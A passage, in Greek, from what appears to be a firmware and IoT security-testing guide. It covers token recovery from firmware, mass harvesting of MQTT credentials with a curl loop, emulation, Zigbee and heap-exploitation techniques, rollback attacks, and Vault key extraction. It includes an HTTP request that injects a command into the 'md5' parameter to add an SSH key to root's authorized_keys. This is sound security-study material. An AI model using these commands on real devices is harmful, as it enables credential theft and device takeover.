2) Ανάκτηση του STATIC_KEY και του αλγορίθμου token από το firmware

- Φορτώστε τα binaries στο Ghidra/radare2 και αναζητήστε τη διαδρομή config ("/pf/") ή τη χρήση του MD5.
- Επιβεβαιώστε τον αλγόριθμο (π.χ., MD5(deviceId||STATIC_KEY)).
- Υπολογίστε το token στο Bash και μετατρέψτε το digest σε κεφαλαία:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Συλλέξτε cloud config και διαπιστευτήρια MQTT

- Συνθέστε το URL και κάντε λήψη του JSON με curl· αναλύστε το με jq για να εξαγάγετε μυστικά:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Εκμεταλλευτείτε το plaintext MQTT και τους αδύναμους ACL θεμάτων (εφόσον υπάρχουν)

- Χρησιμοποιήστε τα ανακτημένα διαπιστευτήρια για να εγγραφείτε σε θέματα συντήρησης και αναζητήστε ευαίσθητα συμβάντα:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Απαριθμήστε προβλέψιμα ID συσκευών (σε μεγάλη κλίμακα, με εξουσιοδότηση)

- Πολλά οικοσυστήματα ενσωματώνουν bytes OUI/προϊόντος/τύπου του κατασκευαστή, ακολουθούμενα από ένα διαδοχικό επίθημα.
- Μπορείτε να επαναλαμβάνετε υποψήφια ID, να παράγετε tokens και να ανακτάτε configs προγραμματιστικά:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Σημειώσεις
- Να λαμβάνετε πάντα ρητή εξουσιοδότηση πριν επιχειρήσετε μαζική απαρίθμηση.
- Όπου είναι δυνατό, προτιμήστε την εξομοίωση ή τη στατική ανάλυση για την ανάκτηση μυστικών, χωρίς να τροποποιείτε το υλικό της συσκευής.


Η διαδικασία εξομοίωσης firmware επιτρέπει τη **δυναμική ανάλυση** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να παρουσιάσει προκλήσεις λόγω εξαρτήσεων από το υλικό ή την αρχιτεκτονική, αλλά η μεταφορά του root filesystem ή συγκεκριμένων δυαδικών αρχείων σε μια συσκευή με αντίστοιχη αρχιτεκτονική και endianness, όπως ένα Raspberry Pi, ή σε μια προ-δημιουργημένη εικονική μηχανή, μπορεί να διευκολύνει περαιτέρω δοκιμές.

### Εξομοίωση μεμονωμένων δυαδικών αρχείων

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιορίσετε το endianness και την αρχιτεκτονική CPU του προγράμματος.

#### Παράδειγμα με αρχιτεκτονική MIPS

Για να εξομοιώσετε ένα δυαδικό αρχείο αρχιτεκτονικής MIPS, μπορείτε να χρησιμοποιήσετε την εντολή:

```bash
file ./squashfs-root/bin/busybox
```

Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, ενώ για binaries little-endian επιλέγεται το `qemu-mipsel`.

#### Εξομοίωση αρχιτεκτονικής ARM

Για binaries ARM, η διαδικασία είναι παρόμοια, με τον emulator `qemu-arm` να χρησιμοποιείται για την εξομοίωση.

### Εξομοίωση πλήρους συστήματος

Εργαλεία όπως τα [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) και άλλα διευκολύνουν την πλήρη εξομοίωση firmware, αυτοματοποιώντας τη διαδικασία και υποστηρίζοντας τη δυναμική ανάλυση.

### Ανακατασκευή διαχωρισμένων και επαληθευμένων root filesystem για εξομοίωση

Αν ένα SquashFS superblock είναι αναγνώσιμο, αλλά οι μετατοπίσεις inode, directory ή fragment table είναι αδύνατες, μην τροποποιήσετε αμέσως το `unsquashfs`. Κάντε reverse engineering στο early boot binary και αναπαραγάγετε το γράφημα block device που δημιουργεί: τα ενσωματωμένα συστήματα μπορεί να εκθέτουν ένα ονομαστικό root partition, αλλά να κατασκευάζουν το πραγματικό filesystem με μια αντιστοίχιση `dm-linear` που προσθέτει sectors τα οποία δανείζεται από άλλο partition. Οι έλεγχοι μόνο του superblock μπορεί να πετύχουν, ακόμη κι όταν όλα τα επόμενα metadata blocks βρίσκονται σε λάθος θέση.<sup>[[11]](#references)</sup>

Διατηρήστε ακριβώς τους αριθμητικούς υπολογισμούς του firmware. Ειδικότερα, προσδιορίστε αν τα μήκη εκφράζονται σε bytes, sectors των 512 byte ή pages των 4 KiB· αναπαραγάγετε τις ολισθήσεις και την αποκοπή με την αρχική τους σειρά· και λάβετε υπόψη τις περιοχές στο τέλος που εξαρτώνται από την τράπεζα σε διατάξεις A/B. Για παράδειγμα, το `(partition_bytes >> 12) << 3` πρώτα αποκόπτει σε όριο 4 KiB και μετά εκφράζει το αποτέλεσμα σε sectors των 512 byte· αν το αντικαταστήσετε με `partition_bytes // 512`, η θέση της προσαρτημένης έκτασης μπορεί να μετατοπιστεί κατά μερικά kilobytes και να αλλοιώσει όλους τους επόμενους πίνακες SquashFS.<sup>[[11]](#references)</sup>

Μια χρήσιμη διαδικασία επικύρωσης είναι η εξής:<sup>[[11]](#references)</sup>

1. Ανακτήστε από το binary verifier/init τη συσκευή προέλευσης, τον αρχικό sector και το μήκος κάθε τμήματος `dm-linear`.
2. Συνενώστε ή αντιστοιχίστε τις εκτάσεις χωρίς να αλλάξετε τη σημασιολογία της ευθυγράμμισής τους.
3. Αν η εξαγωγή εξακολουθεί να αποτυγχάνει, αναζητήστε μόνο σε ένα μικρό παράθυρο γύρω από το προβλεπόμενο όριο και απαιτήστε να εντοπιστούν αρκετές διαδοχικές έγκυρες δομές metadata, αντί να αποδεχτείτε μόνο ένα εύλογο superblock.
4. Εκτελέστε ένα μη τροποποιημένο `unsquashfs` στην ανακατασκευασμένη εικόνα· η επιτυχής περιήγηση σε όλους τους καταλόγους και τα fragments αποτελεί ισχυρότερη ένδειξη από το `unsquashfs -stat`.

#### Αντικατάσταση του dm-verity υπό τον έλεγχο του αναλυτή

Όταν ο αναλυτής ελέγχει τον kernel, το initramfs και τους εικονικούς δίσκους του QEMU, μπορεί να εκκινήσει ένα τροποποιημένο root αντικαθιστώντας το PID 1 επαλήθευσης του vendor με ένα μικρό, στατικά συνδεδεμένο init. Πρόκειται για **αντικατάσταση της αλυσίδας εκκίνησης σε εργαστηριακό περιβάλλον**, όχι για παραβίαση του dm-verity, της υπογραφής RSA, του Secure Boot ή ενός κλειδιού που έχει σφραγιστεί σε TPM.<sup>[[11]](#references)</sup>

Το init αντικατάστασης πρέπει να αναπαράγει τα λειτουργικά μέρη της αρχικής διαδρομής εκκίνησης: να προσαρτήσει το `devtmpfs`, να καλέσει το `setsid()`, να συνδέσει το `/dev/console` με τους file descriptors 0–2, να προσαρτήσει τα `/proc` και `/sys`, να περιμένει τη δοσμένη block device, να προσαρτήσει το τροποποιημένο root μόνο για ανάγνωση, να αποσυνδέσει τα pseudo-filesystems του παλιού root, να μετακινήσει το νέο mount στο `/`, να εκτελέσει `chroot` και να καλέσει το `execve()` για το αρχικό `/sbin/init` του firmware. Η αποσύνδεση των `/dev`, `/proc` και `/sys` **πριν** από το `MS_MOVE` αποφεύγει την κατά λάθος αποσύνδεση σημείων προσάρτησης που ανήκουν στο νέο root.<sup>[[11]](#references)</sup>

Διατηρήστε τη μεταβλητή κατάσταση της συσκευής ξεχωριστά από το τροποποιημένο immutable root. Ένα overlay qcow2 μπορεί να διατηρήσει την κατάσταση LVM του αρχικού δίσκου, ενώ ένας δεύτερος δίσκος virtio μόνο για ανάγνωση παρέχει το τροποποιημένο SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Αποσφαλμάτωση κατάστασης image εκτός σύνδεσης

Επιθεωρήστε την επίμονη κατάσταση έξω από το guest, όταν οι αργές εκκινήσεις, τα καταστροφικά startup scripts ή η αναξιόπιστη καταγραφή στην κονσόλα δυσκολεύουν τον εντοπισμό της αστοχίας. Μην προσαρτάτε ποτέ ένα overlay που χρησιμοποιείται από εκτελούμενη VM· εκθέστε το με το `qemu-nbd`, περιορίστε την αναζήτηση LVM στο προβλεπόμενο διαμέρισμα NBD και απενεργοποιήστε την ομάδα τόμων πριν από την αποσύνδεσή της.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Για επαναλήψιμη απομόνωση σφαλμάτων, γράψτε αρχεία-δείκτες με χρονοσήμανση σε έναν σταθερό τόμο με δυνατότητα εγγραφής και επαληθεύστε τα εκτός σύνδεσης· τα `/dev/kmsg`, τα FIFO και οι προσωρινές κονσόλες μπορεί να δώσουν ψευδώς αρνητικά αποτελέσματα λόγω περιορισμού ρυθμού ή πρόωρου τερματισμού διεργασιών. Επίσης, συγκρίνετε τις ακριβείς διεπαφές μεταξύ επιπέδων πριν αλλάξετε άσχετο κώδικα: `uname -r` έναντι του `/lib/modules/`, τις δυνατότητες του ext4 στον δίσκο έναντι της διαμόρφωσης του kernel και τη γενιά του Mesa `libGL` έναντι του ABI του DRI driver και των ονομάτων driver που προκύπτουν από το PCI. Ένα στοιχείο μπορεί να υπάρχει και ακόμη και να φορτώνεται επιτυχώς με `dlopen()`, αλλά να παραμένει άχρηστο επειδή ο καταναλωτής του αναμένει διαφορετικό ABI.<sup>[[11]](#references)</sup>

### Αντιστοίχιση μηνυμάτων Zigbee / radio-co-processor

Σε IoT hubs, το RF stack συχνά διαχωρίζεται ανάμεσα σε ένα **radio MCU** και μια διεργασία Linux userland. Μια χρήσιμη ροή εργασίας είναι η χαρτογράφηση της διαδρομής:<sup>[[8]](#references)</sup>

1. **RF frame** στον αέρα
2. **controller-side parser** στο radio MCU
3. **serial/UART text ή TLV protocol** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
4. **application dispatcher** στον κύριο daemon
5. **protocol-specific handler / state machine**

Αυτή η αρχιτεκτονική δημιουργεί δύο στόχους για reverse engineering αντί για έναν. Αν ο controller μετατρέπει τα binary radio frames σε text protocol, όπως `Group,Command,arg1,arg2,...`, εντόπισε:

- Τις **message groups** και τους πίνακες dispatch
- Ποια μηνύματα μπορούν να προέλθουν από το **network** και ποια από τον ίδιο τον controller
- Τα ακριβή **manufacturer-specific discriminator fields** (για παράδειγμα Zigbee `manufacturer_code` και το custom `cluster_command`)
- Ποιοι handlers είναι προσβάσιμοι μόνο κατά τις φάσεις **commissioning**, discovery ή λήψης firmware/model

Ειδικά για το Zigbee, κατέγραψε την κίνηση pairing και έλεγξε αν ο στόχος εξακολουθεί να βασίζεται στο προεπιλεγμένο **Link Key** `ZigBeeAlliance09`. Αν ναι, η υποκλοπή της κίνησης commissioning μπορεί να αποκαλύψει το **Network Key**. Οι install codes του Zigbee 3.0 μειώνουν αυτή την έκθεση, οπότε σημείωσε αν η συσκευή που δοκιμάστηκε τους επιβάλλει πράγματι.

### Manufacturer-specific protocol handlers και προσβασιμότητα μέσω FSM

Οι vendor-specific εντολές Zigbee/ZCL είναι συχνά καλύτερος στόχος από τα standard clusters, επειδή τροφοδοτούν **custom parsing code** και εσωτερικά **FSMs** με λιγότερο δοκιμασμένη επικύρωση.<sup>[[8]](#references)</sup>

Πρακτική ροή εργασίας:

- Κάνε reverse engineering στον command dispatcher μέχρι να εντοπίσεις τον **vendor-only handler**.
- Ανάκτησε τους πίνακες **FSM state**, **event**, **check**, **action** και **next-state**.
- Εντόπισε τις **transitional states** που προχωρούν αυτόματα, καθώς και τα branches retry/error που τελικά κάνουν reset ή απελευθερώνουν state ελεγχόμενο από τον attacker.
- Επιβεβαίωσε ποιες νόμιμες ανταλλαγές πρωτοκόλλου απαιτούνται για να θέσουν τον daemon στην ευάλωτη κατάσταση, αντί να υποθέσεις ότι ο προβληματικός handler είναι πάντα προσβάσιμος.

Για πρωτόκολλα ευαίσθητα στον χρονισμό, η επανάληψη packet από ένα Python framework μπορεί να είναι υπερβολικά αργή. Μια πιο αξιόπιστη προσέγγιση είναι να προσομοιώσεις μια νόμιμη συσκευή σε πραγματικό hardware (για παράδειγμα ένα **nRF52840**) με stack επιπέδου vendor, ώστε να εκθέσεις τα σωστά **endpoints**, **attributes** και τον χρονισμό του commissioning.

### Κατηγορία σφαλμάτων σε fragmented downloads σε embedded daemons

Μια επαναλαμβανόμενη κατηγορία firmware bugs εμφανίζεται σε **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>

1. Το **first fragment** (`offset == 0`) αποθηκεύει το `ctx->total_size` και κάνει allocate `malloc(total_size)`.
2. Τα επόμενα fragments επικυρώνουν μόνο τα attacker-controlled **packet-local** πεδία, όπως `packet_total_size >= offset + chunk_len`.
3. Η αντιγραφή χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς να ελέγχει ότι το μέγεθος δεν υπερβαίνει το **αρχικό μέγεθος της allocation**.

Έτσι, ένας attacker μπορεί να στείλει:

- Ένα έγκυρο first fragment με **μικρό** δηλωμένο συνολικό μέγεθος, ώστε να γίνει μικρή heap allocation.
- Ένα μεταγενέστερο fragment με το **αναμενόμενο offset**, αλλά μεγαλύτερο `chunk_len`.
- Ένα πλαστό packet-local μέγεθος που περνά τους νέους ελέγχους, ενώ εξακολουθεί να προκαλεί overflow στο buffer που είχε αρχικά δεσμευτεί.

Όταν η ευάλωτη διαδρομή βρίσκεται πίσω από λογική commissioning, η εκμετάλλευση πρέπει να περιλαμβάνει αρκετή **emulation συσκευής** ώστε ο στόχος να περάσει στην αναμενόμενη κατάσταση λήψης model ή blob πριν σταλούν τα κακοσχηματισμένα fragments.

### Triggers `free()` που προκαλούνται μέσω πρωτοκόλλου

Σε embedded daemons, ο ευκολότερος τρόπος για να προκληθεί heap metadata exploitation συχνά δεν είναι «να περιμένεις τον καθαρισμό», αλλά να **εξαναγκάσεις τον χειρισμό σφαλμάτων του ίδιου του πρωτοκόλλου**:<sup>[[8]](#references)</sup>

- Στείλε κακοσχηματισμένα follow-up fragments για να οδηγήσεις το FSM σε καταστάσεις **retry** ή **error**.
- Ξεπέρασε το όριο επαναλήψεων ώστε ο daemon να κάνει **reset context** και να απελευθερώσει το αλλοιωμένο buffer.
- Χρησιμοποίησε αυτό το προβλέψιμο `free()` για να ενεργοποιήσεις allocator-side primitives πριν καταρρεύσει η διεργασία για άσχετους λόγους.

Αυτό είναι ιδιαίτερα χρήσιμο απέναντι σε allocators τύπου **musl/uClibc/dlmalloc** σε embedded Linux, όπου η αλλοίωση chunk metadata μπορεί να μετατρέψει τη λογική unlink/unbin σε write primitive. Ένα σταθερό μοτίβο είναι η αλλοίωση ενός **size field** ώστε να ανακατευθυνθεί η περιήγηση του allocator σε **fake chunks τοποθετημένα μέσα στο overflowed buffer**, αντί να αλλοιωθούν αμέσως πραγματικοί bin pointers και να καταρρεύσει η διεργασία.

## Binary Exploitation και Proof-of-Concept

Η ανάπτυξη PoC για εντοπισμένες ευπάθειες απαιτεί βαθιά κατανόηση της αρχιτεκτονικής του στόχου και προγραμματισμό σε γλώσσες χαμηλού επιπέδου. Οι προστασίες runtime για binary σε embedded συστήματα είναι σπάνιες, αλλά όταν υπάρχουν, μπορεί να χρειαστούν τεχνικές όπως το Return Oriented Programming (ROP).

### Σημειώσεις για uClibc fastbin exploitation (embedded Linux)

- **Fastbins + consolidation:** Η uClibc χρησιμοποιεί fastbins παρόμοια με τη glibc. Μια μεταγενέστερη μεγάλη allocation μπορεί να ενεργοποιήσει το `__malloc_consolidate()`, οπότε κάθε fake chunk πρέπει να περνά τους ελέγχους (εύλογο size, `fd = 0` και γειτονικά chunks που θεωρούνται "in use").<sup>[[6]](#references)</sup>
- **Non-PIE binaries υπό ASLR:** αν είναι ενεργό το ASLR αλλά το κύριο binary είναι **non-PIE**, οι διευθύνσεις `.data/.bss` εντός του binary είναι σταθερές. Μπορείς να στοχεύσεις μια περιοχή που μοιάζει ήδη με έγκυρη κεφαλίδα heap chunk, ώστε μια fastbin allocation να καταλήξει σε **function pointer table**.
- **NUL που σταματά τον parser:** κατά την ανάλυση JSON, ένα `\x00` στο payload μπορεί να σταματήσει το parsing, διατηρώντας όμως τα επόμενα attacker-controlled bytes για stack pivot/ROP chain.
- **Shellcode μέσω `/proc/self/mem`:** ένα ROP chain που καλεί `open("/proc/self/mem")`, `lseek()` και `write()` μπορεί να τοποθετήσει εκτελέσιμο shellcode σε γνωστό mapping και να μεταβεί σε αυτό.

## Επιθέσεις υποβάθμισης Firmware και μη ασφαλείς μηχανισμοί ενημέρωσης

Ακόμα κι όταν ένας vendor εφαρμόζει ελέγχους cryptographic signatures για εικόνες firmware, συχνά παραλείπεται η **προστασία από επαναφορά σε παλαιότερη έκδοση (downgrade)**. Όταν ο bootloader ή ο recovery-loader ελέγχει μόνο την υπογραφή με ένα ενσωματωμένο public key, αλλά δεν συγκρίνει την *έκδοση* (ή έναν monotonic counter) της εικόνας που γίνεται flash, ένας attacker μπορεί νόμιμα να εγκαταστήσει ένα **παλαιότερο, ευάλωτο firmware που εξακολουθεί να έχει έγκυρη υπογραφή**, επαναφέροντας έτσι ευπάθειες που είχαν διορθωθεί.<sup>[[4]](#references)</sup>

Τυπική ροή επίθεσης:

1. **Απόκτησε μια παλαιότερη υπογεγραμμένη εικόνα**
   * Κατέβασέ την από το δημόσιο portal λήψεων, το CDN ή τον ιστότοπο υποστήριξης του vendor.
   * Εξήγαγέ την από συνοδευτικές εφαρμογές για κινητά/desktop (π.χ. από το `assets/firmware/` μέσα σε ένα Android APK).
   * Ανάκτησέ την από αποθετήρια τρίτων, όπως το VirusTotal, αρχεία του Internet, forums κ.λπ.
2. **Ανέβασε ή διέθεσε την εικόνα στη συσκευή** μέσω οποιουδήποτε διαθέσιμου καναλιού ενημέρωσης:
   * Web UI, API εφαρμογής κινητού, USB, TFTP, MQTT κ.λπ.
   * Πολλές καταναλωτικές IoT συσκευές εκθέτουν endpoints HTTP(S) χωρίς authentication, τα οποία δέχονται firmware blobs κωδικοποιημένα σε Base64, τα αποκωδικοποιούν από την πλευρά του server και ενεργοποιούν recovery/upgrade.
3. Μετά το downgrade, εκμεταλλεύσου μια ευπάθεια που διορθώθηκε σε νεότερη έκδοση (για παράδειγμα, ένα φίλτρο command-injection που προστέθηκε αργότερα).
4. Προαιρετικά, κάνε flash ξανά την πιο πρόσφατη εικόνα ή απενεργοποίησε τις ενημερώσεις, ώστε να αποφύγεις τον εντοπισμό αφού αποκτήσεις persistence.

### Παράδειγμα: Command Injection μετά από Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Στο ευάλωτο firmware (με υποβαθμισμένη έκδοση), η παράμετρος `md5` συνενώνεται απευθείας σε μια εντολή shell χωρίς εξυγίανση, επιτρέποντας την εισαγωγή αυθαίρετων εντολών (εδώ, για την ενεργοποίηση πρόσβασης root μέσω SSH key). Οι νεότερες εκδόσεις του firmware εισήγαγαν ένα βασικό φίλτρο χαρακτήρων, αλλά η απουσία προστασίας από υποβάθμιση καθιστά άχρηστη τη διόρθωση.<sup>[[4]](#references)</sup>

### Παράκαμψη anti-rollback μόνο μέσω updater σε σχεδιασμούς A/B slot

Ορισμένοι προμηθευτές υλοποιούν έναν **ratchet** κατά του downgrade, αλλά μόνο στη λογική του *updater* (για παράδειγμα, σε μια ρουτίνα UDS μέσω CAN, σε μια εντολή recovery ή σε έναν OTA agent του userspace). Αν ο **bootloader** ελέγχει αργότερα μόνο την υπογραφή/CRC του image και εμπιστεύεται τον πίνακα διαμερισμάτων ή τα metadata των slot, η προστασία από rollback μπορεί και πάλι να παρακαμφθεί.<sup>[[7]](#references)</sup>

Συνήθης αδύναμος σχεδιασμός:

- Τα metadata του firmware περιέχουν έναν περιγραφέα έκδοσης και έναν **security ratchet** / monotonic counter.
- Ο updater συγκρίνει το ratchet του image με μια τιμή αποθηκευμένη σε persistent storage και απορρίπτει παλαιότερα υπογεγραμμένα image.
- Ο bootloader **δεν** αναλύει αυτό το ratchet και επαληθεύει μόνο το header, το CRC και την υπογραφή πριν εκκινήσει το επιλεγμένο slot.
- Η ενεργοποίηση του slot αποθηκεύεται ξεχωριστά, σε πίνακα διαμερισμάτων ή σε generation counter ανά slot, και **δεν συνδέεται κρυπτογραφικά** με το ακριβές firmware digest που επικυρώθηκε.

Αυτό δημιουργεί ένα primitive **validate-one-image / boot-another-image** σε συστήματα dual-slot. Αν ο επιτιθέμενος μπορεί να κάνει τον updater να ορίσει το slot B ως επόμενο στόχο εκκίνησης χρησιμοποιώντας ένα τρέχον υπογεγραμμένο image και στη συνέχεια να αντικαταστήσει το slot B πριν από την επανεκκίνηση, ο bootloader μπορεί και πάλι να εκκινήσει το υποβαθμισμένο image, επειδή εμπιστεύεται μόνο τα metadata του slot που έχουν ήδη επικυρωθεί.

Συνήθης τρόπος κατάχρησης:

1. Μεταφόρτωσε ένα **τρέχον υπογεγραμμένο** firmware στο ανενεργό slot και εκτέλεσε την κανονική ρουτίνα επικύρωσης/εναλλαγής, ώστε η διάταξη να ορίσει αυτό το slot ως επόμενο ενεργό.
2. **Μην κάνεις ακόμη επανεκκίνηση**. Επανέλαβε τη ρουτίνα προετοιμασίας/διαγραφής slot στην ίδια συνεδρία.
3. Εκμεταλλεύσου παρωχημένη κατάσταση εκκίνησης ή παρωχημένη λογική επιλογής slot, ώστε ο updater να διαγράψει το **ίδιο φυσικό slot** που μόλις προωθήθηκε.
4. Γράψε ένα **παλαιότερο αλλά ακόμη υπογεγραμμένο** firmware σε αυτό το slot.
5. Παράλειψε τη ρουτίνα επικύρωσης που επιβάλλει το ratchet και κάνε απευθείας επανεκκίνηση.
6. Ο bootloader επιλέγει το προωθημένο slot, επαληθεύει μόνο την υπογραφή/ακεραιότητα και εκκινεί το παλιό image.

Τι να αναζητήσεις κατά την αντίστροφη ανάλυση υλοποιήσεων ενημέρωσης A/B:

- Επιλογή slot που προκύπτει από **flags κατά την εκκίνηση**, τα οποία δεν ανανεώνονται μετά από επιτυχημένη εναλλαγή.
- Μια ρουτίνα τύπου `prepare_passive_slot()` που διαγράφει slot με βάση παρωχημένη κατάσταση αντί για την **τρέχουσα επικυρωμένη διάταξη**.
- Μια συνάρτηση τύπου `part_write_layout()` που απλώς αυξάνει έναν **generation counter** / ενεργό flag και δεν αποθηκεύει το hash του επικυρωμένου image.
- Έλεγχοι ratchet που υλοποιούνται σε userspace ή στον κώδικα του updater, αλλά **όχι** στα στάδια ROM / bootloader / secure boot.
- Ρουτίνες διαγραφής ή recovery που αφήνουν το slot επισημασμένο ως εκκινήσιμο, ακόμη και αφού το περιεχόμενό του διαγραφεί και ξαναγραφτεί.

### Λίστα ελέγχου για την αξιολόγηση της λογικής ενημέρωσης

* Προστατεύονται επαρκώς η μεταφορά και η αυθεντικοποίηση του *update endpoint* (TLS + authentication);
* Συγκρίνει η συσκευή **αριθμούς έκδοσης** ή έναν **monotonic anti-rollback counter** πριν από το flashing;
* Επαληθεύεται το image μέσα σε αλυσίδα secure boot (π.χ. οι υπογραφές ελέγχονται από κώδικα ROM);
* Επιβάλλει ο **bootloader το ίδιο ratchet** με τον updater, αντί να ελέγχει μόνο την υπογραφή/CRC;
* Συνδέονται τα metadata ενεργοποίησης του slot με το **επικυρωμένο digest/έκδοση του firmware**, ή μπορεί να τροποποιηθεί ένα slot μετά την προώθησή του;
* Μετά από επιτυχημένη εναλλαγή slot, αναγκάζεται η συσκευή να κάνει επανεκκίνηση ή παραμένουν προσβάσιμες οι επόμενες ρουτίνες ενημέρωσης/διαγραφής στην ίδια συνεδρία;
* Εκτελεί ο κώδικας του userland πρόσθετους ελέγχους λογικής (π.χ. επιτρεπόμενος χάρτης διαμερισμάτων, αριθμός μοντέλου);
* Χρησιμοποιούν οι *μερικές* ή *εφεδρικές* ροές ενημέρωσης την ίδια λογική επικύρωσης;

> 💡  Αν λείπει οποιοδήποτε από τα παραπάνω, η πλατφόρμα είναι πιθανότατα ευάλωτη σε επιθέσεις rollback.

## Ανάκτηση κλειδιών αποκρυπτογράφησης firmware από ενσωματωμένη κατάσταση KMS/Vault

Όταν ένα image ενημέρωσης συνδυάζει μικρά metadata σε plaintext με ένα μεγάλο blob υψηλής εντροπίας, κάνε πρώτα διαλογή του container πριν δοκιμάσεις brute force:<sup>[[1]](#references)</sup>

- Κατέγραψε headers, offsets και όρια γραμμών με `hexdump`, `xxd`, `strings -tx`, `base64 -d` και `binwalk -E`.
- Το `Salted__` συνήθως υποδεικνύει τη μορφή OpenSSL `enc`: τα επόμενα 8 bytes είναι το salt και τα υπόλοιπα bytes είναι το ciphertext.
- Ένα πεδίο Base64 που αποκωδικοποιείται σε ακριβώς `256` bytes αποτελεί ισχυρή ένδειξη ότι πρόκειται για ciphertext RSA-2048 που περιέχει τυλιγμένο τυχαίο κωδικό πρόσβασης/κλειδί συνεδρίας firmware.
- Υλικό PGP αποσυνδεδεμένο από το ίδιο αρχείο συχνά προστατεύει μόνο την αυθεντικότητα· μην υποθέτεις ότι χρησιμοποιείται για εμπιστευτικότητα.

Αν αποτύχει η στατική αναζήτηση κλειδιών (`grep`, `strings`, αναζητήσεις PEM/PGP), κάνε αντίστροφη ανάλυση της **λειτουργικής διαδρομής αποκρυπτογράφησης** αντί να ψάχνεις μόνο ιδιωτικά κλειδιά:

- Αποσυμπίλησε το binary του updater / management και παρακολούθησε ποιος διαβάζει το κρυπτογραφημένο blob, ποιο helper/API το αποκρυπτογραφεί και ποιο λογικό όνομα κλειδιού ζητά.
- Αναζήτησε στο εξαγόμενο root filesystem κατάσταση KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), καθώς και αρχεία unit και scripts init.
- Αντιμετώπισε εντολές `vault operator unseal ...` σε plaintext, recovery keys, bootstrap tokens ή τοπικά scripts αυτόματου unseal KMS ως ισοδύναμα με υλικό ιδιωτικού κλειδιού.

Αν η συσκευή περιλαμβάνει το αρχικό binary του Vault και το backend αποθήκευσης, η αναπαραγωγή αυτού του περιβάλλοντος είναι συνήθως ευκολότερη από την επανυλοποίηση των εσωτερικών λειτουργιών του Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Με root στο cloned KMS:

- Κάντε τα transit keys εξαγώγιμα μόνο μέσα στο απομονωμένο clone: `vault write transit/keys/<name>/config exportable=true`
- Εξαγάγετε το κλειδί unwrap: `vault read transit/export/encryption-key/<name>`
- Δοκιμάστε το ανακτημένο RSA key με το ακριβές ζεύγος padding/hash που χρησιμοποιεί το KMS. Η αποτυχία αποκρυπτογράφησης με PKCS#1 v1.5 και η αποτυχία της προεπιλεγμένης αποκρυπτογράφησης OAEP **δεν** αποδεικνύουν ότι το key είναι λανθασμένο· πολλές ροές που βασίζονται στο Vault χρησιμοποιούν OAEP με SHA-256, ενώ οι συνήθεις βιβλιοθήκες έχουν ως προεπιλογή το SHA-1.
- Αν το payload αρχίζει με `Salted__`, αναπαράγετε ακριβώς το OpenSSL KDF του κατασκευαστή (`EVP_BytesToKey`, συχνά με MD5 σε παλαιότερες συσκευές) προτού επιχειρήσετε αποκρυπτογράφηση AES-CBC.

Έτσι, το «κρυπτογραφημένο firmware» γίνεται ένα γενικότερο πρόβλημα: **ανακτήστε τα λειτουργικά keys της συσκευής και, στη συνέχεια, αναπαράγετε offline τις ακριβείς παραμέτρους unwrap + KDF**.
